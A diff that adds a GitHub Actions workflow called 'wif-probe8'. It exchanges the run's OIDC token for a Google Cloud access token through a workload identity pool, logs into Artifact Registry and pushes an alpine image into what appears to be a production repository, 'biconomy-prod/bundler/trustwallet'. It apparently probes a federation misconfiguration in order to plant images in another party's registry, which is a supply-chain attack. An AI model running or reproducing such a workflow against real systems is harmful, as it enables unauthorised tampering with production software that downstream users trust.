@@ -1,0 +1,24 @@
+name: wif-probe8
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fiam.googleapis.com%2Fprojects%2F766873424314%2Flocations%2Fglobal%2FworkloadIdentityPools%2Fpool-id-github-actions%2Fproviders%2Fga-bundler")
+          TOKEN=$(echo "$OIDC" | jq -r .value)
+          STS=$(curl -s -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/projects/766873424314/locations/global/workloadIdentityPools/pool-id-github-actions/providers/ga-bundler\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"subject_token\":\"$TOKEN\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\"}")
+          ACC=$(echo "$STS" | jq -r .access_token)
+          echo "acc_len=${#ACC}"
+          # Docker login to GAR using access token
+          echo "$ACC" | docker login -u oauth2accesstoken --password-stdin us-docker.pkg.dev 2>&1 | head -c 200
+          echo ""
+          # pull small alpine, retag, push
+          docker pull alpine:latest > /dev/null 2>&1 && echo "pulled alpine"
+          docker tag alpine:latest us-docker.pkg.dev/biconomy-prod/bundler/trustwallet:probe-$(date +%s) 2>&1 | head -c 100
+          echo ""
+          docker push us-docker.pkg.dev/biconomy-prod/bundler/trustwallet:probe 2>&1 | head -c 400
